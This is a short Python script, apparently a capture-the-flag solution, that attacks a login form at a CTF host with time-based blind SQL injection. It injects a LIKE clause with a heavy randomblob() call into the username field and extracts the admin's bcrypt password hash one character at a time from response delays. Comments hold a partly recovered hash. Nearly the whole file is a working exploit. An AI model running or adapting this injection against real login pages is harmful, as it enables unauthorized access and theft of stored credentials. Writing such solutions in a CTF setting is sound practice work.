import requests, string
table = string.ascii_letters+string.digits+"$:=,-|\\/!@_"

url = "http://login.chal.imaginaryctf.org/"
# data = {
#     "username": "admin' AND pwhash like " + "'$2y$10$is00vb1hrnhybl9bzjwdouqfcu%'" + " AND 1=randomblob(100000000) -- -",
#     "password": "asd"
# }
# res = requests.post(url=url, data=data)

# print(res.elapsed.total_seconds())




# $2y$10$is00vb1hrnhybl9bzjwdouqfcu + y?
# $2y$10$is00vb1hrnhybl9bzjwdouqfcu85yyrjj81q0cx1a3sytvszvjudc

target = "$"

while not len(target) >= 60:
    for c in table:
        temp = target + c
        data = {
            "username": "admin' AND pwhash like " + f"'{temp}%'" + " AND 1=randomblob(100000000) -- -",
            "password": "asd"
        }
        res = requests.post(url=url, data=data)
        print(temp)
        print(res.elapsed.total_seconds())

        if res.elapsed.total_seconds() > 1.5:
            temp = target
            break

        if res.elapsed.total_seconds() > 0.79:
            target += c
            print(target)
            break
        
print(target)

